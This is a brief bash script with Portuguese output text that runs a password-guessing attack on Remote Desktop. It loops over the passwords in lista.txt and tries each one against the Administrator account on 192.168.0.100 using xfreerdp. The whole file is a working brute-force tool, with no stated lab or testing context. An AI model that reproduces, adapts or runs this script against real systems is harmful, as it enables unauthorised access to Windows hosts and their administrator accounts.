#!/bin/bash

for pass in $(cat lista.txt);
do
echo "Testando senha: $pass"
xfreerdp /u:Administrator /d:dominio /p:$pass /v:192.168.0.100 /w:800 /h:600;
done
